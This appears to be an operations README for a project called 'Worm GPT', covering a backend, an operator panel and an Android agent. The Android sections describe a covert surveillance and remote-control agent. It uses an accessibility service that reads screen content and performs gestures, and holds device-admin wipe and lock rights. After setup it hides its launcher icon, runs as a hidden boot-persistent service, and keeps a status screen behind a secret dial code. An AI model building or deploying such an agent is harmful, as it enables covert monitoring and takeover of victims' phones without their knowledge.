# OPS

## Enrollment & device credentials (phase-1)

### Server env
| Var | Purpose |
|---|---|
| `ENROLL_SECRET` | HMAC key for enroll JWTs (30 min, single-use). **Required in production** — dev default exists. |
| `PANEL_PII_KEY` | 64-hex AES-256 key encrypting `devices.phone_enc`. Unset → phone stored masked-only, reveal returns null. |
| `LEGACY_CREDENTIAL` | `true` (default) accepts the pre-phase-1 derived credential. See cutoff below. |

### Flow
1. Panel mints a token: `POST /api/v1/devices/enroll-token` (user auth) → JWT bound to the issuing user. For re-issue on an existing device: `POST /api/v1/devices/:id/enroll-token`.
2. The app gets the token via `-PWG_ENROLL_TOKEN=<jwt>` at build time (baked into `BuildConfig.WG_ENROLL_TOKEN`), `am start -e enroll_token <jwt>` (dev hook), or the wizard's paste-token field after a failure.
3. Wizard seal → `POST /api/v1/devices/enroll` `{enrollToken, deviceId, platform, appType, variant, fingerprint, identity:{displayName, phone}}` → server consumes the JWT, creates the device, returns `{deviceId, credential}` (32 random bytes, base64url — shown ONCE).
4. App stores the credential AES-GCM in `IdentityVault` and uses it as Bearer for heartbeat/commands/SSE/files/chat. `WormSvc` refuses to run before a credential (or a legacy `registration.json`) exists.
5. PII: `phone` column stays empty; real value lives in `phone_enc` (AES-GCM), display uses `phone_masked` (`+201****5678`). `POST /devices/:id/phone/reveal` (user auth) returns the plaintext and writes a `phone_reveal` audit event.

### Legacy credential cutoff plan
Old installs authenticate with `sha256("device-credential:"+deviceId+":global-dev-seed")`, stored in `devices.device_token_hash`. While `LEGACY_CREDENTIAL=true`:
- The authenticator falls back to `deviceTokenHash` when `credentialHash` doesn't match and marks the request `legacyCredential` (auditable).
- The seed-based `/devices/enroll` path (plain `enrollToken` + `ownerUsername`) still works and is logged `legacy:true`.

Cutoff: after every live device heartbeats once with a vault credential (check `credential_hash IS NOT NULL` coverage in SQL), set `LEGACY_CREDENTIAL=false`, deploy, then drop the `enrollToken`/`deviceTokenHash` legacy branches in a later cleanup phase. Devices still on the old credential must re-enroll via `POST /devices/:id/enroll-token`.

### Enrollment verification (emulator)
Mint → `./gradlew :app:assembleWormDebug -PWG_ENROLL_TOKEN=<jwt>` → install → wizard (name+gender+phone+perms) → finish. Expected: `devices` row `display_name`/`phone_masked` filled, `phone` empty, `credential_hash` set, `last_seen` ticking every ~15s; app vanishes, `WormSvc` alive.

## Android

### Flow
1. Launch (via `LauncherBoost` alias, red, "Worm GPT") -> intro bubbles "أهلاً بيك" / "هناخد دقيقة واحدة بس" with typing dots.
2. Name: 2..40 chars, Next disabled until valid.
3. Checklist rows, each opens its own intent: overlay, accessibility (real `WormA11yService`, gate reads `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES`), all-files, battery-opt, device-admin, notifications. Re-checked on every `ON_RESUME`. Next blocked until overlay + accessibility + battery-opt + device-admin are green.
4. Phone: strict E.164 (`^\+[1-9]\d{9,14}$`), +20 prepended for local numbers.
5. Summary + "إنهاء": seal → `ServerRegistrationApi` enrolls via `POST /devices/enroll` (single-use JWT; `FakeRegistrationApi` under `mock_perms`) → credential + identity persist → **vanish runs immediately**: black veil 2000ms → `WormSvc` → `LauncherBoost` disabled with `DONT_KILL_APP` → `pendingHide` cleared → finish. The flag exists so a kill mid-veil re-runs the vanish on next launch.
6. Enroll failure → banner + retry + copy-token/paste-token field; the agent never starts before enrollment succeeds.

### Components
| Component | Notes |
|-----------|-------|
| `WormA11yService` | BIND_ACCESSIBILITY_SERVICE, `res/xml/a11y_config.xml` (canRetrieveWindowContent, canPerformGestures, typeAllMask, feedbackGeneric, timeout 100) |
| `WormSvc` | foregroundServiceType=dataSync, `START_STICKY`, channel `IMPORTANCE_MIN`; writes `filesDir/agent/health.json` `{state, startedAt, lastBeat}` on start and every 60s |
| `BootRcv` | BOOT_COMPLETED + LOCKED_BOOT_COMPLETED + MY_PACKAGE_REPLACED; swallows `ForegroundServiceStartNotAllowedException` |
| `SecretRcv` | dial `*#*#2468#*#*` -> `StatusActivity` (alias state, health-from-disk incl. stale detection, phone) |
| `AdminRcv` | `DeviceAdminReceiver`, policies wipe-data + force-lock in `res/xml/device_admin.xml` |

### Debug
- Secrets: health age shows at `*#*#2468#*#*`; stale (>2 missed beats) renders "قديمة".
- Registrations outbox: `adb shell run-as com.wormgitty.agent cat files/registrations/queue.jsonl`
- Health snapshot: `adb shell run-as com.wormgitty.agent cat files/agent/health.json`
- Alias state: `adb shell pm list packages -e | grep wormgitty` or the status screen.

## Panel

### Token handling
- Access token: memory only (`src/lib/api.js`).
- Refresh token: `localStorage["refresh_token"]`.
- On 401: exactly one `/api/auth/refresh` + retry of the original call; if refresh dies, purge and redirect `#/login`.
- 429: cooldown banner, 30s countdown then auto reload. 500: retry button. Network down: offline banner.

### Mocks
- MSW worker starts only when `VITE_USE_MOCK=true` (set in `.env.development`); production builds ship no worker.
- Fixtures: `panel/mocks/fixtures/index.js` (3 devices, operator `ops@wormgitty.local` / `w0rm-gitty-pass`).
- Auth-enforced mocks: admin endpoints demand `Authorization: Bearer`; 5 failed logins trigger 429 cooldown.
- Fault injection for tests: `window.__wg_fault` (`auth401Left`, `refreshFail`); request log: `window.__wg_captured`.

## Gate

`scripts/gate.sh` runs, in order:
```
backend: npm test
android: ./gradlew test lint
         connectedWormDebugAndroidTest connectedGhostDebugAndroidTest
         connectedMasterDebugAndroidTest
panel:   npm ci && npm test && npx playwright test
```
Any failure exits non-zero.

## Endpoint & TLS (phase-2)

- `WG_BASE_URL` (gradle property) is baked into `BuildConfig.WG_BASE_URL`; default `http://10.0.2.2:3000` (emulator loopback). Override per device: `-PWG_BASE_URL=https://agent.example.com` at build, or at runtime from the StatusActivity secret screen (`*#*#2468#*#*`) — persisted in `endpoint_prefs` DataStore and applied at `WormSvc.onCreate` / `MainActivity.onCreate` before any traffic.
- `usesCleartextTraffic=false`; `res/xml/network_security_config.xml` permits cleartext only to `10.0.2.2`/`localhost`/`127.0.0.1`. Any remote endpoint MUST be `https://` — an `http://` remote host fails fast (by design).
- Production topology: terminate TLS at a reverse proxy (nginx/caddy) in front of Fastify; set `WG_BASE_URL=https://<domain>` when building the APK. The agent speaks plain `HttpURLConnection` — TLS is handled by the platform trust store, so a publicly-trusted cert needs no extra config. Self-signed certs are NOT supported (add a `<certificates>` override in the NSC only for a controlled lab).
- CORS: the panel is same-origin via the vite proxy. If the panel is hosted elsewhere, set `PANEL_ORIGIN` — only that exact origin receives `Access-Control-Allow-Origin`; other origins get no CORS headers.

## CI

Actions disabled (monthly quota exhausted on a private repo). Gate is `scripts/gate.sh`, local only.
